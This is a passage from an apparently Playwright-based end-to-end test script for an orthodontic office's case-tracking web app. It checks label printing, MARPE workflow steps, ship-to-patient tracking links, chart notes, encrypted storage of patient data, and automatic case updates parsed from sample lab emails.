    && txEnds.join(' | ') === 'Start ' + txFmt[0] + ' | Expected removal ' + txFmt[1] && /^Dates saved on this set/.test(await owner.textContent('#drawer .txFrom')), 'the graph: the treatment, today, Start and Expected removal (' + txEnds.join(' · ') + ')');
  const txSaved = await owner.evaluate(() => { const c = findCase(S.openId); return { s: c.txStart, e: c.txEnd, at: c.txAt }; });
  check(txSaved.s === txS && txSaved.e === txE && txSaved.at > 0, 'the dates are saved on the case (with when they were saved)');
  check(!JSON.stringify(await fsDump()).includes(txS) && !JSON.stringify(await fsDump()).includes(txE), 'the treatment dates are stored encrypted (not readable in the database)');
  await owner.click('#drawer [data-act=closeDrawer] >> nth=0'); await owner.fill('#q', '');
  await openByName(gwen, 'Nadia Setcount'); await gwen.waitForSelector('#drawer #dsS-tx:has-text("Month")', { state: 'attached', timeout: 20000 });
  check(await gwen.textContent('#dsS-tx') === txLine, 'Gwen sees the same Treatment line');
  await gwen.click('#drawer [data-act=closeDrawer] >> nth=0'); await gwen.fill('#q', '');
  // the next set for the patient: the dates are already there, so just a line with Change
  await owner.click('.topBar [data-act=newCase]'); await owner.waitForSelector('#ncForm');
  await owner.click('#ncForm .tt[data-tile=nla]'); await owner.fill('#cf-patient', 'Nadia Setcount'); await owner.fill('#cf-chart', '77-1234');
  await owner.click('.pickRow[data-g=initial] .pick[data-v=no]');
  await owner.waitForSelector('#ncForm #cf-txFromRow:not([hidden])', { timeout: 10000 });
  check(!(await owner.isVisible('#ncForm #cf-txStart')) && /expected removal .*\(from the patient’s earlier set\)\./.test(await owner.textContent('#ncForm #cf-txFrom')), 'New case for the patient’s next set: “Treatment … → expected removal … (from the patient’s earlier set).” — no boxes');
  await owner.click('.modal [data-act=closeModal]');

  console.log('\n# Aligner labels from the case (the Label Maker, filled in)');
  await openByName(owner, 'Tobias Titancase'); await owner.waitForSelector('#alBox');
  check(await owner.isDisabled('#alBox [data-act=labels]'), 'Print labels waits until the aligner counts are entered');
  await owner.click('#drawer [data-act=closeDrawer] >> nth=0');
  await openByName(owner, 'Nadia Setcount'); await owner.waitForSelector('#alBox [data-act=labels]:not([disabled])');
  await owner.click('#alBox [data-act=labels]'); await owner.waitForSelector('#lb-list .lbRow');
  check(await owner.inputValue('#lb-patient') === 'Nadia Setcount' && await owner.inputValue('#lb-set') === 'Refinement #1' && await owner.inputValue('#lb-uTotal') === '12' && await owner.inputValue('#lb-lTotal') === '10', 'labels open filled in: patient, Refinement #1, upper 12, lower 10');
  check(/^13 labels/.test(await owner.textContent('#lb-count')) && (await owner.locator('#lb-prev .print-label').count()) === 2, '1 box label + 12 stage labels, with a preview');
  await owner.check('#lb-at');
  check(/^14 labels/.test(await owner.textContent('#lb-count')), 'the attachment template adds a label');
  await owner.evaluate(() => { window.__printed = null; window.print = () => { window.__printed = { n: document.querySelectorAll('#print-container .print-page').length, box: document.querySelector('#print-container .print-box').textContent, cls: document.body.classList.contains('printLabels'), page: !!document.getElementById('lbPage') }; window.dispatchEvent(new Event('afterprint')); }; });
  await owner.click('#lb-print'); await owner.waitForFunction(() => window.__printed, null, { timeout: 10000 });
  const pr = await owner.evaluate(() => window.__printed);
  check(pr.n === 14 && /23 aligners/.test(pr.box) && /Upper\s*12 aligners/.test(pr.box) && pr.cls && pr.page, 'Print sends 14 labels, one 2×4 page each (box: upper 12, lower 10, AT, total 23)');
  check(!(await owner.evaluate(() => document.body.classList.contains('printLabels') || !!document.getElementById('lbPage'))) && (await owner.evaluate(() => document.querySelector('#print-container').innerHTML)) === '', 'after printing the page is back to normal');
  const [lbDl] = await Promise.all([owner.waitForEvent('download', { timeout: 15000 }), owner.click('#lb-csv')]);
  const lbCsv = fs.readFileSync(await lbDl.path(), 'utf8').trim().split('\n');
  check(lbCsv[0] === 'PATIENT,SETTYPE,LINE1LEFT,LINE1RIGHT,LINE2LEFT,LINE2RIGHT,WEAR,SWITCHDATE' && lbCsv.length === 15 && /UPPER: Stage 1 of 12/.test(lbCsv[3]), 'CSV for Label Live has the same columns and one row per label');
  await owner.click('.modal [data-act=closeModal]'); await owner.click('#drawer [data-act=closeDrawer] >> nth=0'); await owner.fill('#q', '');

  console.log('\n# Company portals on outside aligner cases');
  await openByName(owner, 'Petra Tapform');
  check(await owner.isVisible('#drawer .portals a[href="https://portal.olivortho.com/"][target=_blank]') && await owner.isVisible('#drawer .portals a[href="https://dental-monitoring.com/doctor/login"]'), 'an Oliv case links to the Oliv portal and Dental Monitoring');
  check((await owner.getAttribute('#drawer .portals a >> nth=0', 'rel')) === 'noopener noreferrer', 'portal links open in a new tab without passing anything along');
  const [portalTab] = await Promise.all([owner.context().waitForEvent('page'), owner.click('#drawer .portals a >> nth=0')]);
  await owner.waitForSelector('.toast:has-text("Copied “Petra Tapform”")', { timeout: 10000 });
  check(true, 'opening the portal copies the patient’s name to paste into its search'); await portalTab.close().catch(() => {});
  await owner.click('#drawer [data-act=closeDrawer] >> nth=0');
  await openByName(owner, 'Dmitri Distalson'); check((await owner.locator('#drawer .portals').count()) === 0, 'no portal link on appliances');
  await owner.click('#drawer [data-act=closeDrawer] >> nth=0');
  await openByName(owner, 'Ines Smilewright'); check((await owner.locator('#drawer .portals').count()) === 0, 'no portal link on InSmile');
  await owner.click('#drawer [data-act=closeDrawer] >> nth=0'); await owner.fill('#q', '');

  console.log('\n# MARPE: its own steps (records → lab → Zoom call → design approved → delivered)');
  await owner.click('.topBar [data-act=newCase]'); await owner.waitForSelector('#ncForm');
  await owner.click('#ncForm .tt[data-tile=marpe]'); await owner.fill('#cf-patient', 'Marco Palatewide');
  check(await owner.inputValue('#cf-detail') === 'MARPE' && await owner.inputValue('#cf-stage') === 'records' && (await owner.locator('.pickRow[data-g=lab] .pick[aria-pressed=true]').allTextContents()).join('|') === 'Partners Dental Solutions', 'MARPE has its own tile: starts at Records, lab Partners Dental Solutions');
  check(await owner.isVisible('.pickRow[data-g=records] .pick[data-v=stl]') && await owner.isVisible('.pickRow[data-g=records] .pick[data-v=cbct]') && await owner.isVisible('#cf-zoomDate') && !(await owner.isVisible('.pickRow[data-g=appliances]')), 'asks for the records on file (STL, CBCT) and the Zoom call, not the appliance list');
  await owner.click('.pickRow[data-g=records] .pick[data-v=stl]');
  await owner.click('#ncSave'); await owner.waitForSelector('#modalWrap', { state: 'detached', timeout: 20000 });
  await owner.click('#nav-board'); await owner.fill('#q', ''); await owner.click('[data-act=flow][data-k=marpe]');
  const mCard = 'section[aria-label="Records: STL + CBCT"] .kc:has-text("Marco Palatewide")';
  await owner.waitForSelector(mCard + ' .flag.rec:has-text("Needs CBCT")', { timeout: 20000 });
  check(true, 'board: a MARPE tab; the card says the CBCT is still needed');
  await owner.click(mCard); await owner.waitForSelector('#mpBox [data-act=rec][data-k=cbct]');
  await owner.click('#mpBox [data-act=rec][data-k=cbct]');
  await owner.waitForSelector(mCard + ' .flag.ready:has-text("Records on file")', { timeout: 20000 });
  await owner.waitForFunction(() => { const b = document.querySelector('#mpBox [data-k=cbct]'); return b && b.getAttribute('aria-pressed') === 'true' && !document.querySelector('#mpBox .mpHint'); }, null, { timeout: 20000 });
  check(true, 'ticking CBCT on the case saves it; the card now says Records on file');
  await owner.click('#mpBox [data-act=rec][data-k=cbct]');
  await owner.waitForSelector(mCard + ' .flag.rec:has-text("Needs CBCT")', { timeout: 20000 });
  check(true, 'and unticking it puts Needs CBCT back');
  await owner.click('#drawer [data-act=closeDrawer] >> nth=0');
  await owner.click(mCard + ' .adv'); await owner.waitForSelector('#gGo');
  check(await owner.isDisabled('#gGo') && await owner.isChecked('input[data-rec=stl]') && !(await owner.isChecked('input[data-rec=cbct]')), 'moving it to the lab asks for both records first (STL ticked, CBCT not)');
  await owner.check('input[data-rec=cbct]'); check(!(await owner.isDisabled('#gGo')), 'ticking the CBCT there allows the move');
  await owner.click('#gGo');
  const sCol = 'section[aria-label="Submitted to lab"] .kc:has-text("Marco Palatewide")';
  await owner.waitForSelector(sCol, { timeout: 20000 }); check(true, 'it moves to Submitted to lab');
  await owner.click(sCol + ' .adv'); await owner.waitForSelector('#gZoomDate');
  check(await owner.isDisabled('#gGo') && (await owner.locator('#gRecs').count()) === 0, 'Zoom call scheduled asks for the call’s date (the records are done)');
  await owner.fill('#gZoomDate', await owner.evaluate(() => addDays(todayISO(), 1))); await owner.fill('#gZoomTime', '14:30'); await owner.click('#gGo');
  const zCard = 'section[aria-label="Zoom call scheduled"] .kc:has-text("Marco Palatewide")';
  await owner.waitForSelector(zCard + ' .due:has-text("Zoom tomorrow 2:30 PM")', { timeout: 20000 });
  check(true, 'the card shows the Zoom call as its next date: Zoom tomorrow 2:30 PM');
  await owner.click('#nav-today'); await owner.fill('#q', 'Marco Palatewide');
  check(await owner.isVisible('.dueGrp:has-text("Tomorrow") .row:has-text("Marco Palatewide") .due:has-text("Zoom")'), 'Today: the Zoom call is under Coming up, tomorrow');
  await owner.fill('#q', ''); await owner.click('#nav-board'); await owner.click('[data-act=flow][data-k=marpe]');
  await owner.click(zCard + ' .adv'); await owner.waitForSelector('section[aria-label="Design approved"] .kc:has-text("Marco Palatewide")', { timeout: 20000 });
  await owner.click('section[aria-label="Design approved"] .kc:has-text("Marco Palatewide") .adv');
  await owner.waitForSelector('section[aria-label="Delivered"] .kc:has-text("Marco Palatewide") .adv[data-act=complete]', { timeout: 20000 });
  await owner.waitForSelector('#cbNo', { timeout: 10000 });
  check(/last step, Delivered/.test(await owner.textContent('#modalWrap .lsub')), 'Design approved → Delivered asks whether it’s complete');
  await owner.click('#cbNo'); await owner.waitForSelector('#modalWrap', { state: 'detached', timeout: 5000 }).catch(() => {});
  check(true, 'Design approved → Delivered (then Mark complete)');
  await openByName(owner, 'Marco Palatewide'); await owner.waitForSelector('#histBox .hist:has-text("Zoom call scheduled")', { timeout: 20000 });
  const mHist = await owner.textContent('#histBox');
  check(/moved it to Zoom call scheduled \(and set Zoom call\)/.test(mHist) && /moved it to Submitted to lab \(and set records on file\)/.test(mHist), 'history says what was filled in with each move');
  check((await owner.getAttribute('#mpBox [data-act=rec][data-k=cbct]', 'aria-pressed')) === 'true' && /2:30 PM/.test(await owner.textContent('#mpBox')), 'the case shows both records on file and the Zoom call');
  await owner.click('#drawer [data-act=closeDrawer] >> nth=0'); await owner.fill('#q', '');
  check(await owner.evaluate(() => stageFromSection('marpe', 'Hold (CBCT/Zoom)') === 'records' && stageFromSection('marpe', 'Submitted') === 'submitted' && stageFromSection('marpe', 'Manufacturing') === 'approved'
    && caseFromAsana({ name: 'Test Person - MARPE', section: 'To Submit', notes: '' }, 'Appliance', []).type === 'marpe' && caseFromAsana({ name: 'Test Person - Herbst', section: 'To Submit', notes: '' }, 'Appliance', []).type === 'appliance'), 'Asana import: MARPE tasks in the Appliance project become MARPE cases at the matching step');
  // a MARPE that was entered or imported as an appliance before
  await owner.evaluate(() => B.createCase({ type: 'appliance', patient: 'Otto Oldmarpe', stage: 'mfg', appliances: ['MARPE'], lab: 'Partner Dental Studios', detail: 'MARPE', comments: [], createdAt: Date.now(), createdBy: meSid() }));
  // (the lab rebranded: Partner Dental Studios is Partners Dental Solutions now — an older case reads with the new name; Amir, 3 Oct 2026)
  await openByName(owner, 'Otto Oldmarpe');
  check(await owner.isVisible('#drawer .dHd .badge:has-text("Partners Dental Solutions")') && !(await owner.isVisible('#drawer .badge:has-text("Partner Dental Studios")')), 'an older case saved under Partner Dental Studios shows Partners Dental Solutions');
  await owner.click('#drawer [data-act=edit]'); await owner.waitForSelector('#drawer .pickRow[data-g=lab]');
  check(await owner.getAttribute('#drawer .pickRow[data-g=lab] .pick[data-v="Partners Dental Solutions"]', 'aria-pressed') === 'true' && (await owner.locator('#drawer .pickRow[data-g=lab] .pick').count()) === 3 && await owner.evaluate(() => sameVal(readCaseForm(document.querySelector('#drawer')).lab, S.editBase.lab)), 'Edit: its lab is the Partners logo (no extra old-name button), and opening Edit doesn’t count the lab as changed');
  await owner.click('#drawer [data-act=cancelEdit]'); await owner.click('#drawer [data-act=closeDrawer] >> nth=0');
  await openByName(owner, 'Otto Oldmarpe');
  check(await owner.isVisible('#drawer .notice.mpOld [data-act=toMarpe]'), 'an older appliance MARPE offers “Switch to MARPE steps”');
  await owner.click('#drawer [data-act=toMarpe]');
  await owner.waitForSelector('#drawer .dHd .badge:has-text("MARPE") >> nth=0', { timeout: 20000 }); await owner.waitForSelector('#drawer .step.cur[data-k=approved]', { timeout: 20000 });
  check(!(await owner.isVisible('#drawer .notice.mpOld')) && await owner.isVisible('#mpBox'), 'one click moves it over; Manufacturing became Design approved');
  await owner.click('#drawer [data-act=closeDrawer] >> nth=0'); await owner.fill('#q', '');

  console.log('\n# Ship to patient (an alert on the case) and one-click tracking');
  await owner.click('.topBar [data-act=newCase]'); await owner.waitForSelector('#ncForm');
  await owner.click('#ncForm .tt[data-tile=appliance]');
  check(!(await owner.isVisible('#cf-ship')), 'no Ship to patient switch for appliances');
  await owner.click('#ncForm .tt[data-tile=oliv]'); await owner.fill('#cf-patient', 'Shelby Shipwell');
  check(await owner.isVisible('#cf-ship') && (await owner.getAttribute('#cf-ship', 'aria-pressed')) === 'false', 'aligner cases have a Ship to patient switch, off by default');
  await owner.click('#cf-ship');
  await owner.click('#ncSave'); await owner.waitForSelector('#modalWrap', { state: 'detached', timeout: 20000 });
  await owner.click('#nav-list'); await owner.fill('#q', 'Shelby Shipwell');
  const sRow = 'tr.click:has-text("Shelby Shipwell")';
  await owner.waitForSelector(sRow + ' td.shipCol .flag.ship', { timeout: 20000 });
  check(true, 'list: Ship to patient shows in its own Shipping column');
  await owner.fill('#q', ''); await owner.click('[data-act=shipF]');
  check((await owner.locator('tbody tr.click').count()) === 1 && await owner.isVisible(sRow), 'the Ship to patient filter shows just those cases');
  await owner.click('[data-act=shipF]');
  await owner.click('#nav-board'); await owner.click('[data-act=flow][data-k=outside]');
  check(await owner.isVisible('.kc:has-text("Shelby Shipwell") .flag.ship'), 'board: the card carries the Ship to patient alert');
  await openByName(owner, 'Shelby Shipwell');
  check(await owner.isVisible('#drawer .notice.ship'), 'the case opens with a Ship to patient banner');
  await owner.click('#drawer [data-act=edit]'); await owner.waitForSelector('#drawer .cf');
  check((await owner.getAttribute('#drawer #cf-ship', 'aria-pressed')) === 'true', 'editing keeps the switch on');
  await owner.fill('#drawer #cf-tracking', '1Z999AA10123456784');
  await owner.click('[data-act=saveEdit]'); await owner.waitForSelector('#drawer .stepper', { timeout: 20000 });
  check(await owner.getAttribute('#drawer .kv a.flag.trk', 'href') === 'https://www.ups.com/track?tracknum=1Z999AA10123456784' && await owner.getAttribute('#drawer .kv a.flag.trk', 'target') === '_blank', 'a UPS tracking # becomes a one-click Track link to UPS');
  check(await owner.evaluate(() => trackInfo('123456789012').carrier === 'FedEx' && trackInfo('9400100000000000000000').carrier === 'USPS' && trackInfo('1Z999AA10123456784').carrier === 'UPS' && !trackInfo('n/a')), 'FedEx, UPS and USPS numbers are recognized');
  await owner.click('#drawer [data-act=closeDrawer] >> nth=0');
  await owner.click('#nav-list'); await owner.fill('#q', 'Shelby Shipwell');
  await owner.waitForSelector(sRow + ' td.shipCol a.flag.trk:has-text("Track UPS")', { timeout: 20000 });
  check(true, 'list: Track UPS sits next to the alert');
  const [trkTab] = await Promise.all([owner.context().waitForEvent('page'), owner.click(sRow + ' td.shipCol a.flag.trk')]);
  await sleep(300); check(!(await owner.isVisible('#drawer')), 'clicking Track opens the carrier’s page in a new tab, not the case'); await trkTab.close().catch(() => {});
  await owner.fill('#q', '');
  dump = JSON.stringify(await fsDump());
  check(!dump.includes('Shipwell') && !dump.includes('Palatewide') && !dump.includes('1Z999AA1012'), 'MARPE and shipping details are encrypted too');
  // shipped to the patient = complete (Amir, 3 Oct 2026): its steps end at Shipped, its date is the expected delivery,
  // and reaching Shipped completes the case; Undo reopens it at the step it was on
  await openByName(owner, 'Shelby Shipwell');
  check(await owner.evaluate(() => Array.from(document.querySelectorAll('#drawer .stepper .step')).map(b => b.dataset.k).join(',')) === 'submit,dra,mfg,shipped', 'shipped to the patient: its steps end at Shipped (no Arrived or Checked into Milestones)');
  check(/Expected delivery/.test(await owner.textContent('#drawer .kv')) && !/Delivery appt/.test(await owner.textContent('#drawer .kv')), 'its date is the Expected delivery (no appointment)');
  await owner.click('#drawer .step[data-k=shipped]');
  await owner.waitForSelector('.toast:has-text("shipped to the patient — case complete")', { timeout: 20000 });
  await owner.waitForFunction(() => !document.querySelector('#drawer') && !openCases().some(c => c.patient === 'Shelby Shipwell'), null, { timeout: 20000 });
  check(true, 'moving it to Shipped completes the case (and closes it)');
  await owner.click('.toast:has-text("case complete") button');
  await owner.waitForFunction(() => { const c = openCases().find(x => x.patient === 'Shelby Shipwell'); return c && c.stage === 'submit'; }, null, { timeout: 20000 });
  check(true, 'Undo reopens it at the step it was on');
  await owner.evaluate(() => B.createCase({ type: 'oliv', patient: 'Sid Shipboard', stage: 'mfg', shipToPatient: true, deliveryDate: '2026-10-20', comments: [], createdAt: Date.now(), createdBy: meSid() }));
  await owner.fill('#q', ''); await owner.click('#nav-board'); await owner.click('[data-act=flow][data-k=outside]');
  const sidCard = 'section[aria-label="Manufacturing"] .kc:has-text("Sid Shipboard")';
  await owner.waitForSelector(sidCard, { timeout: 20000 }).catch(e => boardDiag(owner, 'Sid Shipboard', e));
  check(await owner.getAttribute(sidCard + ' .adv', 'title') === 'Shipped to the patient — completes the case' && /Expected delivery/.test(await owner.textContent(sidCard + ' .due')), 'board: the arrow says the next step ships and completes it; the chip reads Expected delivery');
  await owner.click(sidCard + ' .adv');
  await owner.waitForSelector('.kc:has-text("Sid Shipboard")', { state: 'detached', timeout: 20000 });
  await owner.click('#nav-done'); await owner.fill('#q', 'Sid Shipboard'); await owner.waitForSelector('tr.click:has-text("Sid Shipboard")', { timeout: 20000 });
  await owner.click('tr.click:has-text("Sid Shipboard")'); await owner.waitForSelector('#histBox .hist:has-text("marked it complete")', { timeout: 20000 });
  check(/moved it to Shipped and marked it complete \(shipped to the patient\)/.test(await owner.textContent('#histBox')) && /Shipped/.test(await owner.textContent('#drawer .dsS')), 'the board arrow shipped it: Completed, at Shipped; history says so');
  await owner.click('#drawer [data-act=closeDrawer] >> nth=0'); await owner.fill('#q', '');

  console.log('\n# Chart note, lab case #, Ship to patient turns on No IPR and No attachments');
  await openByName(owner, 'Theo Toothchart');
  const note = await owner.textContent('#noteTxt');
  check(/^Scanned with /.test(note) && /No IPR\./.test(note) && /Crown: UR1\./.test(note) && !/Gwen|Kaylee|Sarah/.test(note) && !/[’“”–—]/.test(note), 'each case has a chart note from its entry (scan, instructions, IPR, teeth; no assistant; plain punctuation)');
  await owner.click('#drawer [data-act=closeDrawer] >> nth=0'); await owner.fill('#q', '');
  await owner.click('.topBar [data-act=newCase]'); await owner.waitForSelector('#ncForm');
  await owner.click('#ncForm .tt[data-tile=invisalign]'); await owner.fill('#cf-patient', 'Sven Shipsworth');
  await owner.click('#cf-ship');
  check(await owner.getAttribute('.rxTile[data-v="No IPR"]', 'aria-pressed') === 'true' && /No attachment: all teeth/.test(await owner.textContent('#cf-teethSum')), 'Ship to patient switches on No IPR and No attachments on all teeth');
  await owner.click('#cf-ship');
  check(await owner.getAttribute('.rxTile[data-v="No IPR"]', 'aria-pressed') === 'false' && !/No attachment/.test(await owner.textContent('#cf-teethSum')), 'switching it off takes them off again');
  await owner.click('#cf-ship');
  await owner.click('#ncForm details.cfMore summary'); await owner.fill('#cf-labRef', 'INV-4455');
  await owner.click('#ncSave'); await owner.waitForSelector('.toast:has-text("Copy chart note")', { timeout: 20000 });
  check(true, 'after creating a case, the message offers to copy its chart note');
  await owner.click('#nav-list'); await owner.fill('#q', 'INV-4455'); await owner.waitForSelector('tr.click:has-text("Sven Shipsworth")', { timeout: 20000 });
  await owner.click('tr.click:has-text("Sven Shipsworth") td.stg'); await owner.waitForSelector('#drawer .stepper');
  check(await owner.isVisible('#drawer .kv :text("Invisalign patient #")') && /No IPR\./.test(await owner.textContent('#noteTxt')) && /shipped to the patient/.test(await owner.textContent('#noteTxt')), 'the lab case # shows on the case (and search finds it); the note says No IPR and shipped to the patient');
  await owner.click('#drawer [data-act=closeDrawer] >> nth=0'); await owner.fill('#q', '');

  console.log('\n# Chart note: what the patient was told, at the scan and at delivery (Amir, 5 Oct 2026: "instructed pt to stay in the last set night time only. no elastics with aligners")');
  await newCase(owner, { type: 'nla', patient: 'Rory Refinewell', initial: 'no' });
  await openByName(gwen, 'Rory Refinewell');
  const rn = await gwen.textContent('#noteTxt');
  check(/^Scanned/.test(rn) && /\nInstructed pt to stay in the last set, night time only\. No elastics with aligners\.$/.test(rn), 'a refinement’s scan note ends with what the patient was told (on Gwen’s screen)');
  check(!(await gwen.$('#drawer .noteFrom')) && /Scan visit/.test(await gwen.textContent('#dsS-note')), 'staff see which visit it is, and no link to Team & security');
  await gwen.click('#drawer .noteTabs [data-v=del]');
  check(/^Delivered in-house aligners \(NL Lab\) - refinement\.\nPt back to full-time wear with the new aligners\. Reviewed aligner wear and care\.$/.test(await gwen.textContent('#noteTxt')), 'Delivery visit: what went out and what the patient was told');
  const mine = 'Pt back to full-time wear with the new aligners, a new one every 7 days.';
  await owner.click('#nav-admin'); await owner.waitForSelector('#niRow-alR'); await owner.click('#niRow-alR summary');
  await owner.fill('#ni-alR-del', mine); await owner.press('#ni-alR-del', 'Tab');
  await owner.waitForSelector('#niRow-alR .niOwn', { timeout: 20000 });
  await gwen.waitForFunction(m => document.querySelector('#noteTxt').textContent.endsWith('\n' + m), mine, { timeout: 20000 });
  check(true, 'Dr. A words it his way in Team & security; Gwen’s open note follows at once');
  check(await owner.evaluate(async () => { const d = (await FB.db.doc('meta/settings').get()).data(); return d.noteInstr && d.noteInstr['alR.del']; }) === mine, 'kept in the office settings');
  await owner.click('#niRow-alR [data-act=niReset]');
  await gwen.waitForFunction(() => /\nPt back to full-time wear with the new aligners\. Reviewed aligner wear and care\.$/.test(document.querySelector('#noteTxt').textContent), null, { timeout: 20000 });
  check(true, 'Back to the suggested wording: Gwen’s note follows');
  await gwen.click('#drawer [data-act=closeDrawer] >> nth=0'); await gwen.fill('#q', ''); await owner.click('#nav-today');

  console.log('\n# Email updates: the script in a Gmail account → the app updates cases');
  await owner.evaluate(async () => {
    const mk = o => B.createCase(Object.assign({ comments: [], createdAt: Date.now(), createdBy: meSid() }, o));
    await mk({ type: 'oliv', patient: 'Opal Brightwater', stage: 'submit' });
    await mk({ type: 'ulab', patient: 'Ulysses Marchetti', stage: 'mfg' });
    await mk({ type: 'ulab', patient: 'Selma Shipdirect', stage: 'mfg', shipToPatient: true });
    await mk({ type: 'angel', patient: 'Anya Velasquez', stage: 'submit' });
    await mk({ type: 'appliance', patient: 'Priya Quillfeather', stage: 'submitted', lab: 'Partner Dental Studios', appliances: ['Schwartz'] });
    await mk({ type: 'marpe', patient: 'Mira Holdsworth', stage: 'submitted', lab: 'Partner Dental Studios', records: ['stl', 'cbct'] });
    await mk({ type: 'appliance', patient: 'Rory Tamsin', stage: 'mfg', lab: 'Specialty Orthodontic Lab', appliances: ['MARA'] });
  });
  await owner.click('#nav-admin'); await owner.waitForSelector('#mailAdmin [data-act=mailSetup]', { timeout: 20000 });
  await owner.click('#mailAdmin [data-act=mailSetup]'); await owner.click('#cbYes');
  await owner.waitForSelector('#mlScript', { timeout: 30000 });
  const script = await owner.inputValue('#mlScript');
  check(/"botEmail":"mailbot\.[a-z0-9]+@staff\.thenextlevelorthodontics\.com"/.test(script) && /"botPassword":"[A-Z0-9]{32}"/.test(script) && !script.includes('/*NLO_CONFIG*/null'), 'Set up email updates makes a robot login and hands out the script with it filled in');
  await owner.click('.modal [data-act=closeModal]');
  dump = JSON.stringify(await fsDump());
  check(!dump.includes(script.match(/"botPassword":"([A-Z0-9]{32})"/)[1]), 'the robot’s password is stored only sealed');
  const H = 3600e3, now = Date.now();
  const emails = [
    { id: 'e1', date: now - 3 * H, from: 'Oliv Doctors <doctor@olivortho.com>', subject: 'Oliv™: O. Brightwater (700111) setup is ready', text: 'Please approve or request changes using the button below.', html: '<p>Please approve or request changes using the button below.</p><a href="https://portal.olivortho.com/cases/700111" style="color:#fff">View Treatment Plan</a>' },
    { id: 'e2', date: now - 2 * H, from: 'uLab Systems <noreply@ulabsystems.com>', subject: 'Your uLab order ZQ88 has shipped.', text: 'Your Order Has Shipped!\nDear Next Level Orthodontics,\nGreat news! The following order is on the way to your office:\nOrder Number: ZQ88\nPatient Name: Ulysses Marchetti\nClick here to track your order: 777766665555' },
    { id: 'e3', date: now - H, from: 'general@partnersdentalstudio.com', subject: 'Daily Cases Received, Shipped, and Held', text: '', html:
      '<p>Here is your daily summary of all cases received, shipped, and placed on hold today.</p><table><tr><td>Customer ID: next Level Ortho</td></tr></table><p>No Cases Received Today</p><table><tr><th>Patient Name</th><th>Case Number</th></tr></table>' +
      '<p>Cases Shipped Today</p><table><tr><th>Patient Name</th><th>Invoice Number</th><th>Tracking Number</th><th>Carrier</th></tr><tr><td>Priya Q.</td><td>228635</td><td><a href="https://www.ups.com/track?tracknum=1Z7F167A0211300001">1Z7F167A0211300001</a></td><td>UPS</td></tr>' +
      '<tr><td>Robin T.</td><td>228636</td><td>1Z7F167A0211300002</td><td>UPS</td></tr></table>' +
      '<p>Cases On Hold in the last 7 Days</p><table><tr><th>Patient Name</th><th>Case Number</th><th>Hold Date</th><th>Hold Reason</th></tr><tr><td>Mira H.</td><td>55120</td><td>10-01-2026</td><td>Need lower jaw in the CBCT</td></tr></table>' },
    { id: 'e4', date: now - H, from: 'iOrtho.America@angelaligner.com', subject: 'Angel Aligner: Treatment Plan to be Reviewed', text: 'Dear Dr. Amir Akhavan,\nYour treatment plan for patient (patient:Anya Velasquez #A12BC ) is ready for review. Please login to iOrtho to review.' },
    { id: 'e5', date: now - H, from: 'A Friend <friend@example.com>', subject: 'Lunch', text: 'not for the app' },
    { id: 'e6', date: now - H, from: 'uLab Systems <noreply@ulabsystems.com>', subject: 'Your uLab order ZQ77 has shipped.', text: 'Your Order Has Shipped!\nOrder Number: ZQ77\nPatient Name: Selma Shipdirect\nClick here to track your order: 777755554444' }
  ];
  const gas = makeGas({ source: script, messages: emails, user: 'office@example.com' });
  const run1 = gas.ctx.setup();
  check(/5 emails sent/.test(run1) && gas.triggers.length === 1, 'the script (run in a stand-in for Google) passes its encryption self-test, sends the 5 lab emails and turns on its 10-minute check (' + run1 + ')');
  const st = name => owner.evaluate(n => { const c = openCases().find(x => x.patient === n); return c ? { stage: c.stage, tracking: c.tracking || '', labRef: c.labRef || '', planUrl: c.planUrl || '', hold: c.labHold || null } : null; }, name);
  await owner.waitForFunction(() => { const s = n => (openCases().find(x => x.patient === n) || {}).stage; return s('Opal Brightwater') === 'dra' && s('Ulysses Marchetti') === 'shipped' && s('Priya Quillfeather') === 'shipped' && s('Anya Velasquez') === 'dra'
    && !!(openCases().find(x => x.patient === 'Mira Holdsworth') || {}).labHold; }, null, { timeout: 30000 }).catch(() => {});
  const o = await st('Opal Brightwater'), u = await st('Ulysses Marchetti'), pq = await st('Priya Quillfeather'), mh = await st('Mira Holdsworth'), an = await st('Anya Velasquez');
  check(o.labRef === '700111' && o.planUrl === 'https://portal.olivortho.com/cases/700111', 'Oliv “setup is ready” → Dr. A action, with Oliv’s case # and the plan link');
  check(u.tracking === '777766665555' && u.labRef === 'ZQ88', 'uLab shipped → Shipped, with the FedEx tracking # and the order #');
  check(pq.tracking === '1Z7F167A0211300001', 'Partners’ daily summary → the right appliance shipped, with the UPS tracking # (matched on “Priya Q.”)');
  check(mh && mh.hold && /lower jaw/.test(mh.hold.reason) && mh.stage === 'submitted', 'a case on hold at Partners gets the hold and its reason');
  check(an.labRef === 'A12BC', 'Angel “Treatment Plan to be Reviewed” → Dr. A action, with Angel’s patient #');
  await owner.waitForFunction(() => !openCases().some(x => x.patient === 'Selma Shipdirect'), null, { timeout: 20000 }).catch(() => {});
  const sel = await owner.evaluate(async () => { const c = (await B.loadClosed(30)).find(x => x.patient === 'Selma Shipdirect'); return c ? { status: c.status, stage: c.stage, tracking: c.tracking || '' } : null; });
  check(sel && sel.status === 'done' && sel.stage === 'shipped' && sel.tracking === '777755554444', 'uLab shipped for a case shipped to the patient → Shipped and complete, with the tracking #');
  await owner.click('#nav-today'); await owner.waitForSelector('#mailCard .mlRow:has-text("Robin T.")', { timeout: 20000 });
  check((await owner.locator('#mailCard .mlRow').count()) === 1, 'Today: only the shipment it couldn’t place waits for someone to pick the case');
  const rid = await owner.evaluate(() => openCases().find(c => c.patient === 'Rory Tamsin').id);
  await owner.selectOption('#mailCard .mlSel', rid); await owner.click('#mailCard [data-act=mailApply]');
  await owner.waitForFunction(() => { const c = openCases().find(x => x.patient === 'Rory Tamsin'); return c && c.stage === 'shipped' && /1Z7F167A0211300002/.test(c.tracking || ''); }, null, { timeout: 20000 });
  await owner.waitForFunction(() => !document.querySelector('#mailCard'), null, { timeout: 20000 });
  check(true, 'picking the case applies it (Shipped, tracking #) and the card clears');
  await owner.waitForFunction(async () => (await B.inboxLoad()).length === 0, null, { timeout: 20000 });
  check(true, 'every handled email leaves the inbox');
  await openByName(owner, 'Opal Brightwater'); await owner.waitForSelector('#histBox .hist:has-text("Oliv email")', { timeout: 20000 });
  check(/Oliv email\s*moved it to Dr\. A action and saved the lab case #, plan link/.test(await owner.textContent('#histBox')) && await owner.isVisible('#drawer .portals a:has-text("View treatment plan")'), 'history says the Oliv email did it; the case has a View treatment plan button');
  await owner.click('#drawer [data-act=closeDrawer] >> nth=0');
  await openByName(owner, 'Mira Holdsworth');
